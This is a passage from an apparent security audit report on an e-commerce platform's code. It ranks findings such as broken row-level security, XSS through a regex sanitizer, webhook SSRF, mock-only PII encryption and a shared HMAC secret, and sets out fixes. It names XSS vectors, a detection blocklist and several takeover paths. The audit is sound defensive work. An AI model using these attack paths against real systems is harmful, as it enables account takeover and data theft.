`services/api-gateway/src/index.ts:614-624` uses `credentials: true` with an **origin callback** `resolveCredentialedCorsOrigin` (`lib/cors.ts:93-106`) that returns the request origin **only if it is in a generated allowlist** (`buildPlatformCredentialOrigins` + `CORS_CREDENTIAL_ORIGINS`); otherwise it returns the **default origin**, never the requester's. `normalizeCredentialOrigin` (`:63-76`) rejects non-HTTPS, userinfo, query, and path. This is the textbook-safe credentialed-CORS pattern — **not** an `Access-Control-Allow-Origin: *`-with-credentials bug, and **not** a reflector. Positive finding.

### 10.4 SEC-003 (S2) — input-validation middleware logs dangerous payloads but **never blocks**

`services/api-gateway/src/middleware/security.ts:152-163`: `hasDangerousContent(body)` (a `<script>`/`javascript:`/`on*=` blocklist) runs on every mutating JSON body, but on a hit it **only logs** — `"Don't block — just log. The output sanitization in responses handles the XSS."` The premise is false for the storefront: the "output sanitization" on the buyer path is the **broken** `sanitizeRenderedHtml` regex (SEC-001), not a real sanitizer. So this WAF-lite is **security theater** — it neither blocks injection at ingress nor is backstopped by a working egress sanitizer on the XSS-relevant path. **Fix (S):** either block on detection for non-HTML fields, or (better) fix SEC-001 and stop pretending egress handles it.

### 10.5 GraphQL — custom regex shim, no real introspection; **SEC-010 (S2)** missing depth limit

`services/api-gateway/src/graphql/` is a **regex-based REST shim** (`cost.ts`, `admin.ts`, `storefront.ts`, `rest-shim.ts`), not a schema-graph GraphQL server: it pattern-matches field names and delegates to REST. Consequences:
- **No `__schema`/`__type` resolver** → no live introspection leak (positive).
- The interpolated-regex field extraction (`cost.ts:72,79`) uses **static const arrays** (`CONNECTION_FIELDS`, `HEAVY_ADMIN_FIELDS`) for `fieldName`, so **no ReDoS via attacker-controlled field name** (positive).
- **SEC-010 (S2): no query-depth limit.** `calculateGraphQLQueryCost` scores by flat field-count `/8` capped at 250 (`cost.ts:82-107`) with no AST-depth analysis. A deeply nested or heavily-aliased query is under-priced; the global `queryCostRateLimit` (20 pts/s, cap 200) is the only backstop. Because the shim delegates to REST, depth-amplification is bounded by the REST fan-out, so this is S2 not S1 — but a real GraphQL server would need depth + alias-count limits. The whole shim is also flagged by ARCH/REPO as rejected-architecture surface that should be feature-gated off.

### 10.6 Security headers, rate-limiting, error leakage

- **Rate-limiting (positive).** Global `queryCostRateLimit` on `/*` (`index.ts:641-645`), `authRateLimit` on `/auth/*` (`:662-669`), `appOAuthRateLimit` on OAuth + bridge (`:677-680`). The limiter is **fail-closed** — `queryCostUnavailableResult` returns `allowed:false` when KV/Redis is down (`rateLimit.ts:585-…`), confirming the AUTH-audit finding. Sensitive money routes (`/payments`, `/payouts`, `/settlements`) inherit the global limiter + auth + step-up.
- **Error leakage (positive).** 194 route sites return raw `error.message`, but the global `errorResponseSanitizer` (`security.ts:90-129`) post-processes every 4xx/5xx JSON via `sanitizePublicErrorPayload` (`public-errors.ts:85-119`), which **replaces** `DB_ERROR`/`PAYMENT_ERROR`/etc. with fixed strings and **strips** `details`/`hint`/`cause`/`stack`. Raw Postgres error text does not leave the worker. **SEC-011 (S3):** codes in `CLIENT_ACTIONABLE_ERROR_CODES` (`:31-66`) preserve the raw message — a route mislabeling a sensitive string under e.g. `VALIDATION` would leak it; low risk.
- **Debug endpoints:** none found (`/debug`, `/__`, `/whoami`, `/dump` absent from production routers).

---

## 11. Cryptography (A02)

### 11.1 SEC-014 (S1) — PII field-level encryption is **mock-only**, against a constitution that requires real KMS

`services/api-gateway/src/lib/crypto.ts:102-165`: the KMS abstraction exists (`KmsProvider`, `KmsEnvelope`, `kms.`-prefixed envelopes) but the **only working provider is the mock** — `createMockKmsProvider` uses a hardcoded `secret: 'letbuyy-local-mock-kms-envelope-secret'` (`:146`), and `createLiveKmsProvider` returns a `SKIP_NEEDS_HUMAN_KMS_KEY_ID` skeleton that throws `KmsHumanRequiredError` (`:160-165`, comment "[HUMAN-REQUIRED] Live KMS provider credentials… must be configured outside git"). V1 §3/§8 mandates **field-level PII encryption with a KMS**. In reality, customer PII (name, phone, address, GSTIN) is stored in **plaintext** columns — the same `store_customers`/`orders` columns FND-004 shows are **anon-readable** via the RLS-to-PUBLIC leak. So the constitution's strongest data-protection control is unimplemented, and the data it was supposed to protect is also exposed by A01. **S1** (not S0 only because the live exploit is the *RLS* leak, already an S0; this finding is the missing compensating control). **Fix (L):** implement a real KMS provider (Cloudflare Secrets/HSM or external KMS), envelope-encrypt PII columns, and key-rotate per the 90-day policy already documented.

### 11.2 AUTH-002 (S1, cross-link) — HS256 everywhere ⇒ verification key = forgery key

Reconfirmed from this phase's vantage: every token family is symmetric HMAC, and `AUTH_SECRET` is the **fallback** for at least seven trust domains (identity cookie, console session, checkout grant, **media-upload ticket — SEC-008**, data-export, internal-console, webhook-internal). No RS256/ES256 in live use (OIDC IdP disabled). A single `AUTH_SECRET` disclosure forges all of them. The dev `.env.local` (SEC-016) literally shares one string across six of these vars, demonstrating how the fallback collapses separation. **Carried as AUTH-002.**

### 11.3 Crypto positives

- **CSPRNG everywhere it matters.** All OTP/TOTP/gift-card/token/nonce/salt generation uses `crypto.getRandomValues` / `crypto.randomUUID` / `crypto.subtle` (`totp.ts:56`, `two-factor.ts:146`, `products.ts:869` gift cards, `store-access-password.ts:15` salt, `store-payment-config.ts:36` AES-GCM IV, and ~12 more sites). The only `Math.random` uses are **non-security** request/telemetry/event IDs (`telemetry.ts:20`, `api-client:3086`, `event-core:1198`). **No insecure randomness in a security context.**
- **bcrypt cost 12** for passwords (per AUTH audit), **AES-GCM** for payment-secret-at-rest with a **dedicated** `PAYMENT_CONFIG_ENCRYPTION_KEY` (`stores.ts:362,406-408`) that is **separate from `AUTH_SECRET`** (the right call). **SEC-012 (S3):** that AES key is derived as a bare `SHA-256(secret)` with no salt/HKDF (`store-payment-config.ts:30-33`) — acceptable for a high-entropy 256-bit key, weak if the configured key is low-entropy; prefer HKDF.
- **SHA-1 usage is all legitimate** — TOTP (RFC 6238 mandates SHA-1: `totp.ts:65,76`), WhatsApp/Meta signature (`whatsapp-commerce-adapter:226`), console HMAC (`console-auth-server.ts:161`). **No MD5/SHA-1 used as a security hash for integrity/passwords.** No alg-confusion path (alg pinned / 2-segment no-header tokens, per AUTH audit).

---

## 12. Dependencies & Supply Chain (A06)

**Strong posture — best-scoring area.**

- **`pnpm.overrides` actively pins CVE'd transitive deps** (`package.json`): `hono@<4.12.4 → 4.12.4`, `undici@<6.24.0 → 6.24.0`, `minimatch` (3 ranges), `picomatch` (2 ranges), `defu@<=6.1.4 → 6.1.5`, `fast-uri@<=3.1.1 → 3.1.2`, `flatted`, `socket.io-parser`. This is evidence of an active advisory-remediation loop.
- **`onlyBuiltDependencies=esbuild,sharp,unrs-resolver,workerd`** (`.npmrc:7`) + `node-linker=isolated` — install/build scripts are denied for everything except four vetted native deps. **No `postinstall`/`preinstall`/`prepare` scripts** in any workspace package. This closes the dominant npm-supply-chain RCE vector.
- **Lean third-party footprint** on the money path: api-gateway depends only on `hono`, `zod`, `bcryptjs`, `hash-wasm` (+ workspace pkgs); the theme engine adds `liquidjs ^10.27.0` (sandbox-configured). `jose ^6`, `@upstash/ratelimit ^2`, `otplib ^12`, `@supabase/supabase-js ^2.95` are all current.
- **SEC-021 (S3):** dual `bcryptjs` versions coexist (`^2.4.3` in one package, `^3.0.3` elsewhere). 2.4.3 is years old; unify on 3.x. Minor.
- `production-security-controls.yaml` declares `dependencyScan: npm-audit-and-pnpm-audit` + `sbomGenerator: cyclonedx` — **SEC-022 (S2):** verify these run as **blocking** CI gates (the `ci.yml` job list should be checked); declared-in-policy ≠ enforced-in-pipeline.

---

## 13. CI/CD & Infrastructure (A05/A08)

- **Least-privilege CI tokens (positive).** `ci.yml:13-14` and `deploy-staging.yml:8-9` set `permissions: contents: read`. No workflow grants blanket `write-all`. Secrets are injected from GitHub Secrets, never inlined.
- **Secrets-in-workflow (positive).** All `${{ secrets.* }}` references are env-injected (`CLOUDFLARE_API_TOKEN`, `VERCEL_TOKEN`, DB URLs, operations tokens); none are echoed or written to artifacts in the sampled steps.
- **SEC-022 (S2) — deployment signing / SBOM declared but enforcement unverified.** `production-security-controls.yaml` claims `deploymentSigning.required: true`, `artifactAttestation: required`, `sbom: required`, and `rotationWindowDays: 90`. These are policy assertions; whether `production-deploy.yml` actually **blocks** on attestation/SBOM (vs. documenting it) is **UNVERIFIED** from the YAML alone and should be confirmed against the workflow's job graph. Cross-link TOPO-002: the prod branch is 30 commits behind, so even enforced gates protect an estate running pre-remediation code.
- **SEC-023 (S2) — edge WAF is a scanner-path blocklist, not OWASP managed rules.** `infrastructure/dns/dns.tf:151-192` defines `cloudflare_ruleset "waf_block_scanners"` blocking requests whose path *contains* known scanner strings (`waf_scanner_paths`). This stops trivial scanners but is **not** a managed-ruleset WAF and provides no SQLi/XSS/RCE signature coverage. R2 buckets (`infrastructure/cloudflare/storage.tf:11-17`) have no explicit public-access config — **private by Cloudflare default** (public R2 requires explicit custom-domain binding), so no public-bucket finding, but recommend an explicit deny + the cookieless-media-domain from SEC-007.
- **Infra positives:** `production-security-controls.yaml` mandates platform-console + operations-portal **MFA required + allowlist + audit**, rotation runbooks, and a `security_enforcement_events` evidence table with an inspection API.

---

## 14. DoS / Abuse (A05/A09)

- **SEC-024 (S2) — public storefront order-create has no Turnstile, only the global cost limiter (cross-link CHK-012).** `POST /storefront/:subdomain/orders` (`checkout-payment-routes.ts:244`) is unauthenticated and **does not call `requireValidTurnstile`** (which *is* applied to `/contact` at `public-routes.ts:1196` and other public POSTs). It is idempotency-gated (good vs. duplicates) and the RPC is inventory-safe, but an attacker can sustain ~20 req/s/IP to (a) consume inventory reservations and starve real buyers (compounds the dead TTL-sweeper, CHK-002), (b) create junk orders, and (c) flood the `platform_queue_jobs` abandonment-check queue. **Fix (S):** require Turnstile on the public order-create exactly as the contact route does.
- **SEC-010 (S2)** GraphQL depth — see §10.5.
- **ReDoS — low.** The `sanitizeRenderedHtml` and `hasDangerousContent` regexes run on potentially large merchant HTML; they are linear-ish (no nested quantifier catastrophe), and Liquid render is bounded by `renderLimit`/`memoryLimit`/`parseLimit`. No catastrophic-backtracking pattern found. The 1 MB request-body cap (`security.ts:144`) bounds ingress.
- **Unbounded pagination — bounded (positive).** Public product list clamps `limit` to 100 (`public-routes.ts:751`), `by-ids` slices to 100 (`:782`), Liquid drop keys capped (`MAX_LIQUID_DROP_KEYS`, `theme-renderer.ts:457`).

---

## 15. UNIFIED CROSS-PHASE SECURITY RANKING

The security-relevant **S0/S1** findings across all 12 phases, de-duplicated, with original IDs and this audit's severity confirmation. (S2/S3 from prior phases are retained in their home registers; this table is the cross-phase escalation view.)

### The 9 S0s across the entire audit

| Orig ID | Phase | Title | Why S0 | This audit |
|---|---|---|---|---|
| **FND-001** | 3 | `products`/`product_variants`/`product_options` RLS `service_role_* USING(true)` → **PUBLIC** | Anon read+write **all merchants'** products (price/inventory) via PostgREST | **S0 (live, all branches)** |
| **FND-002** | 3 | `orders` baseline `service_role_orders USING(true)` PUBLIC survives under permissive-OR | Anon read **all tenants' orders** + buyer PII | **S0 (live)** |
| **FND-003** | 3 | `sites` `service_role_sites USING(true)` PUBLIC | Anon read every store + **overwrite ownership columns** → account takeover | **S0 (live)** |
| **FND-004** | 3 | `store_customers`/`customer_activity_log`/`wishlists` `USING(true)` PUBLIC | Anon read **all customer PII** (name/phone/address/email) — also defeats SEC-014 | **S0 (live)** |
| **FND-005** | 3 | `super_admin_allowlist` `service_role_manage_allowlist USING(true)` PUBLIC | Anon **INSERT self as super-admin** → walks through `requireSuperAdmin` | **S0 (live)** |
| **FND-006** | 3 | `subscriptions`/`billing_history` `USING(true)` PUBLIC | Anon read/write **billing** records | **S0 (live)** |
| **AUTH-001 / TOPO-001** | 6/1 | `/api/auth/switch` mints a session for any `email_verified` account in the body | **Unauthenticated takeover** of any verified merchant/staff; fix is **uncommitted** so all deploy branches are vulnerable | **S0 (live on every branch)** |
| **TOPO-002** | 1 | Production `main` is 30 commits behind `stepup/main` | All remediation (incl. the AUTH-001 fix, RLS fixes if any landed) is **undeployed**; prod runs pre-wave code | **S0 (release)** |
| **DB-004 + DB-009 (joint)** | 7 | Gateway connects as `service_role` (BYPASSES RLS) **and** ledger append-only is trigger-only with zero REVOKE | Tenant isolation + ledger immutability both reduce to "the gateway role is trusted"; one query bug or `DISABLE TRIGGER` = cross-tenant write / mutable money history. Phase 7 itself flags this pair as "closest to S0." | **S0 (architectural)** |

> Note: the six FND S0s carry the documented **GRANT precondition** (exploitable iff `anon`/`authenticated` hold table GRANTs). Phase 3 establishes with high confidence — via the 107-migration header ("readable with the public anon key"), Supabase schema-wide default grants, and **zero `REVOKE` in the entire corpus** — that the grants are present. Live grant state is **UNVERIFIED** (cannot run prod DB), but the policy defects are unconditional.

### S1 security findings (cross-phase)

| Orig ID | Phase | Title | Severity |
|---|---|---|---|
| **AUTH-002** | 6 | Shared `AUTH_SECRET` HS256 across 7 trust domains; verification key = forgery key | S1 |
| **AUTH-003** | 6 | RBAC ceiling rests on the one broken `super_admin_allowlist` RLS policy | S1 |
| **SEC-001** | 12 | Storefront stored-XSS via theme/product HTML through a bypassable regex sanitizer (no DOMPurify) | S1 |
| **SEC-006** | 12 | Outbound webhook SSRF (merchant URL, no internal-IP blocklist) with 2 KB response exfiltration | S1 |
| **SEC-014** | 12 | PII field-level encryption / KMS is mock-only vs. V1 mandate; PII plaintext | S1 |
| **PAY F1/F6/F7** | 4 | Money disappears: legacy capture/COD/refund paths never write canonical ledger | S1 |
| **PAY F8** | 4 | Step-up on refund/payout is a string-length check (forgeable second factor) | S1 |
| **PAY F10 / ARCH-002** | 4/2 | Payout rail hardcoded `razorpayx` (self-custody, violates R-6) | S1 |
| **DB-011 / PAY F7** | 7/4 | `post_settlement_ledger_transaction` sets tenant GUC from its own param → cross-store ledger posting | S1 |
| **ARCH-004** | 2 | Non-atomic outbox dual-write → money/lifecycle event loss on crash | S1 |
| **ARCH-007** | 2 | Checkout extensions + app-function runtime execute inside the live payment route | S1 |
| **DB-002** | 7 | 32-bit integer-minor money columns overflow at ₹2.14 cr | S1 |
| **DB-006** | 7 | Returns-path refunds not ledgered | S1 |
| **CHK-001** | 5 | Signed `checkout_url` does not bind cart contents | S1→S2 (RPC re-prices) |
| **TOPO-003…008** | 1 | Two-constitution split; rejected surfaces deployed; domain split-brain; 4-way identity; dead CQRS | S1 |

---

## 16. Findings Register — NEW (Phase 12)

Severity: **S0** = critical/exploitable-now (money/data/takeover); **S1** = high; **S2** = medium; **S3** = low/hardening. Fix complexity: **S** ≤ ½ day, **M** ≤ a few days, **L** = a project.

| ID | Sev | OWASP | Area | Title | Root Cause | Evidence (path:line) | Impact | Fix | Recommended Fix |
|---|---|---|---|---|---|---|---|---|---|
| **SEC-001** | **S1** | A03 | XSS | Storefront renders merchant/theme HTML through a bypassable regex sanitizer; no DOMPurify; Liquid not auto-escaped | Hand-rolled blocklist instead of a real sanitizer; `liquidjs` configured without `outputEscape` | `composition-engine.tsx:84`; `theme-renderer.ts:606-611,255-274`; `product/[productId]/page.tsx` (public, `revalidate=30`) | Stored XSS to **all buyers** (`<svg/onload>`, `<img/onerror>`, `srcdoc`, `<style>`, `formaction`); cookie/session theft, card-skimmer | M | Add DOMPurify (or `sanitize-html`) with a strict allowlist on all rendered theme HTML; OR set Liquid `outputEscape:'escape'` and use `\| raw` only on vetted fields; delete the regex |
| **SEC-002** | S2 | A05 | CSP | Platform CSP allows `script-src 'unsafe-inline'` (+ `style-src 'unsafe-inline'`) on all apps incl. storefront | Inline `<script type=ld+json>`/`<style>` blocks shipped without nonces | `config/security/next-security-headers.ts` (scriptSrc) | Removes the only containment for SEC-001; injected inline script executes | M | Move to per-request nonce/hash `script-src`; nonce the JSON-LD and layout `<style>`; drop `'unsafe-inline'` |
| **SEC-003** | S2 | A05/A09 | API | Input-validation middleware detects dangerous payloads but **logs-never-blocks**, relying on a non-existent egress sanitizer | False premise that "output sanitization handles XSS" — the buyer-path sanitizer is the broken SEC-001 regex | `middleware/security.ts:152-163` | Security theater; ingress injection passes, egress doesn't catch it on the XSS path | S | Block on detection for non-HTML fields; fix SEC-001; stop relying on egress |
| **SEC-004** | S2 | A03 | XSS | theme-marketplace JSON-LD injects `JSON.stringify(structuredData)` **without** `<`-escaping (breakout) | Inconsistent with the escaped JSON-LD on the other two pages | `themes/[slug]/page.tsx:451-454,426-427` | Stored XSS via theme name/description → script in public listing | S | Add `.replace(/</g,'\\u003c')` (as product/app-marketplace pages do) |
| **SEC-005** | S3 | A05 | Headers | Deprecated `X-XSS-Protection: 1; mode=block` set on API | Legacy header retained | `middleware/security.ts:23` | Can introduce vulns in old browsers | S | Set `X-XSS-Protection: 0`; rely on CSP |
| **SEC-006** | **S1** | A10 | SSRF | Outbound app-lifecycle webhook fetches any merchant HTTPS URL with no internal-IP/metadata blocklist; returns 2 KB response preview | Guard checks only `protocol==='https:'` + non-empty host | `app-lifecycle-dispatch.ts:34-41,90-106`; `webhook-service/index.ts:583-589,596-608` | SSRF **with exfiltration** to metadata/internal hosts (env-gated) | M | Resolve host, reject private/loopback/link-local/ULA, re-check after redirect, drop response echo, allowlist app domains |
| **SEC-007** | S2 | A01/A03 | Upload | No content-type allowlist; `image/svg+xml` classified as servable `image` (SVG-with-script) | Schema accepts any 160-char content_type; classifier maps svg→image | `media.ts:44-52,341-346`; `storage-adapter/index.ts:64` | Stored XSS via uploaded SVG if served same-origin | S | Allowlist content types; reject svg/html; cookieless asset domain + `nosniff` + force-download for svg |
| **SEC-008** | S2 | A02 | Upload | Media-upload signing secret falls back to `AUTH_SECRET` (forgeable ticket) | `MEDIA_UPLOAD_SIGNING_SECRET \|\| AUTH_SECRET` | `media.ts:59-64,73-86` | `AUTH_SECRET` leak → forge upload ticket for any `site_id` → cross-tenant write (cross-link AUTH-002) | S | Make `MEDIA_UPLOAD_SIGNING_SECRET` mandatory; fail-closed in prod |
| **SEC-009** | S2 | A08/A09 | Webhooks | Inbound webhook age not enforced (replay window unbounded); outbound has no DLQ poison cap | "do not reject by age"; retry loop without quarantine | `webhook-service/index.ts:714-719,596-608` | Replay (saved only by dedup UNIQUE); failing target re-consumes retry budget | M | Enforce timestamp tolerance inbound; max-attempts→DLQ quarantine outbound |
| **SEC-010** | S2 | A05 | API/DoS | GraphQL cost model has no query-depth/alias-count limit | Heuristic flat-field cost only; regex shim | `graphql/cost.ts:82-107` | Under-priced deep/aliased queries; backstopped only by global limiter | M | Add depth + alias limits; or feature-gate the rejected GraphQL surface off |
| **SEC-011** | S3 | A09 | Errors | Client-actionable error codes preserve raw `error.message` | Allowlist of codes bypasses message replacement | `public-errors.ts:31-66,78-80` | A mislabeled sensitive string under e.g. `VALIDATION` could leak | S | Whitelist message *templates*, not arbitrary strings, even for actionable codes |
| **SEC-012** | S3 | A02 | Crypto | Payment-secret AES key derived as bare `SHA-256(secret)` (no salt/HKDF) | Minimal KDF | `store-payment-config.ts:30-33` | Weak iff configured key is low-entropy | S | Use HKDF with a per-store salt; require 256-bit key entropy |
| **SEC-013** | S2 | A10 | SSRF | WASM-module fetch to developer-controlled `wasm_module_url` (bytes digest-checked, request not) | URL is developer input; no host blocklist | `app-functions-runtime.ts:361-369` | SSRF-by-request to internal hosts (no exfil; aborts on digest mismatch) | S | Private-IP blocklist; require module URL on platform-owned origin |
| **SEC-014** | **S1** | A02 | Crypto/PII | Field-level PII encryption / KMS is **mock-only** vs. V1 mandate; PII stored plaintext | `createLiveKmsProvider` is a `SKIP_NEEDS_HUMAN_` skeleton; only mock works | `lib/crypto.ts:102-165` (144-146,160-165) | Constitution's strongest data-protection control unimplemented; PII plaintext (also exposed by FND-004) | L | Implement real KMS; envelope-encrypt PII columns; 90-day rotation |
| **SEC-015** | S3 | A03 | SSTI | Merchant/author Liquid templates execute server-side | Author-controlled templates by design | `theme-renderer.ts:255-264` | Contained by sandbox (`ownPropertyOnly`, `dynamicPartials:false`, render/memory limits) | — | Accept with monitoring; keep `dynamicPartials:false`; output risk handled by SEC-001 |
| **SEC-016** | S3 | A05 | Secrets | `.env.local` in all 9 apps (untracked+gitignored, benign) reuse one dev secret across 6 vars | Auto-gen dev profile | `apps/*/.env.local`; `.gitignore:88-89` | No committed secret; demonstrates AUTH-002 shared-secret hazard | S | Keep untracked; generate distinct dev secrets per var to mirror prod separation |
| **SEC-017** | S2 | A09 | Logging | Dangerous-input + CSRF events logged but never alerted/blocked | No alerting/SIEM wiring on `console.warn` | `middleware/security.ts:152-163`; `public-errors` path | Attacks observed but not actioned | M | Wire security events to alerting; add ingress block for clear-cut payloads |
| **SEC-018** | S3 | A01 | Upload | `safePathPart` permits `..` in object-key folder | `.` allowed in cleaning regex | `storage-adapter/index.ts:47-55,76` | Harmless in R2 (flat keys); code smell / future-path risk | S | Strip `..` segments explicitly |
| **SEC-019** | S3 | A02 | Secrets | (Positive) No hardcoded production secrets in source | — | sweep across `services/ apps/ packages/` | Only mock/dev literals + `SKIP_NEEDS_HUMAN_` sentinels | — | Maintain; add a secret-scanner CI gate |
| **SEC-020** | S2 | A02 | Secrets | `NEXT_PUBLIC_*` surface is public-by-design (anon key, Razorpay key_id, Turnstile site key) — acceptable; dev-bypass flag is the watch-item | Correct public/secret split | `apps/*/.env.local`; `next-security-headers.ts` | No secret leaked to client; keep `ENABLE_DEV_AUTH_BYPASS` out of prod env | S | Add a CI check banning `*_DEV_AUTH_BYPASS=true` in production project envs |
| **SEC-021** | S3 | A06 | Deps | Dual `bcryptjs` versions (2.4.3 + 3.0.3) | Version skew across packages | repo `package.json` sweep | Old crypto lib coexists | S | Unify on bcryptjs 3.x (or `@node-rs/bcrypt`) |
| **SEC-022** | S2 | A08 | CI/CD | Deployment signing / SBOM / dependency-scan declared in policy but enforcement-in-pipeline UNVERIFIED | Policy YAML ≠ workflow gate | `infrastructure/security/production-security-controls.yaml`; `production-deploy.yml` | Controls may be documentation-only | M | Make attestation + SBOM + `pnpm audit` **blocking** CI gates; verify in workflow graph |
| **SEC-023** | S2 | A05 | Infra | Edge WAF is a scanner-path blocklist, not a managed OWASP ruleset | Custom ruleset only | `infrastructure/dns/dns.tf:151-192` | No SQLi/XSS/RCE signature coverage at edge | M | Enable Cloudflare Managed Rules / OWASP ruleset; keep scanner-path rule as supplement |
| **SEC-024** | S2 | A05/A09 | DoS | Public storefront order-create lacks Turnstile (only global cost limiter); cross-link CHK-012 | Turnstile applied to `/contact` but not `/orders` | `checkout-payment-routes.ts:244`; cf. `public-routes.ts:1196` | Inventory-reservation starvation, junk orders, queue flooding at ~20 rps/IP | S | Require `requireValidTurnstile` on public order-create, as the contact route does |

**NEW findings: 24 — S0 ×0 · S1 ×3 (SEC-001, SEC-006, SEC-014) · S2 ×12 · S3 ×9.**

> Why no NEW S0 in Phase 12: the platform/OWASP surface this phase owns has no *additional* continuously-bleeding catastrophe beyond what the prior phases already registered. The three NEW S1s are each one precondition from S0 — SEC-001 becomes S0 with a confirmed un-escaped injection sink reaching a non-merchant audience or a CSP fix that *doesn't* happen alongside; SEC-006 becomes S0 if a reachable internal/metadata endpoint exists in the runtime; SEC-014 is the missing control behind the FND-004 S0. The phase's role is to (a) surface the buyer-facing XSS + SSRF + PII-encryption gaps the money/auth/db phases didn't, and (b) consolidate the **9 existing S0s** into one ranked view.

---

## 17. Positive Controls Worth Preserving (do not regress)

To keep the remediation honest about what is already right:

1. **CORS** — strict generated allowlist with `credentials:true`, never a reflector (`lib/cors.ts`).
2. **Rate limiting** — fail-closed token bucket (Upstash→KV→in-memory-dev), global + auth + OAuth coverage.
3. **Egress error sanitizer** — replaces DB/provider error text, strips stack/hint/cause on every 4xx/5xx (`public-errors.ts`).
4. **Inbound webhook signatures** — correct per-provider HMAC, timing-safe, fail-closed (Razorpay/Stripe/Cashfree/PayPal/WhatsApp).
5. **CSPRNG discipline** — `crypto.*` for every OTP/TOTP/token/salt/IV; no `Math.random` in security paths.
6. **Supply chain** — `pnpm.overrides` CVE pinning, `onlyBuiltDependencies`, no postinstall scripts, lean money-path deps.
7. **CI tokens** — `permissions: contents: read`; secrets via GitHub Secrets.
8. **Liquid sandbox** — `ownPropertyOnly`, `dynamicPartials:false`, render/parse/memory limits.
9. **Ownership checks** — `verifySiteOwnership`/`verifyStoreOwnership` on first-party object-by-ID routes (no live IDOR).
10. **WASM integrity** — SHA-256-gated module bytes; mock-mode banned in prod; `SKIP_NEEDS_HUMAN_` sentinels block accidental live activation.
11. **Header baseline** — HSTS+preload, `nosniff`, `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, `frame-ancestors`, `Permissions-Policy`.
12. **Mass-assignment avoidance** — explicit field-pick loops and whitelisted literals on every write.

---

## 18. Remediation Priority (security-only, sequenced)

**P0 — before any production traffic (these are the existing S0s):**
1. **Commit + deploy the `/api/auth/switch` fix** (AUTH-001/TOPO-001) and **execute the merge runbook** (TOPO-002) so remediation actually ships.
2. **Add `TO service_role` (or rewrite to `auth.role()='service_role'`) to every `USING(true)` baseline policy** and **`REVOKE … FROM anon, authenticated`** on `products/orders/sites/store_customers/subscriptions/billing_history/super_admin_allowlist` (FND-001…006).
3. **Move the gateway off the BYPASSRLS `service_role` connection** for tenant tables and **`REVOKE UPDATE,DELETE` on the ledger** (DB-004/DB-009).

**P1 — before merchant onboarding at scale:**
4. **Replace the regex sanitizer with DOMPurify** + **drop `'unsafe-inline'` from CSP** (SEC-001 + SEC-002 must land together).
5. **Add the SSRF blocklist + drop the response-preview echo** on outbound webhooks (SEC-006) and wasm fetches (SEC-013).
6. **Implement real KMS + envelope-encrypt PII** (SEC-014); make all per-domain secrets mandatory, kill `\|\| AUTH_SECRET` on money/identity/storage paths (AUTH-002, SEC-008), and migrate the token kernel to ES256.
7. **Turnstile on public order-create** (SEC-024); **content-type allowlist + cookieless media domain** (SEC-007).

**P2 — hardening:** SEC-004, SEC-009, SEC-010, SEC-017, SEC-022, SEC-023, and the S3 cluster.

---

*End of Phase 12 — Security Forensic Audit.*
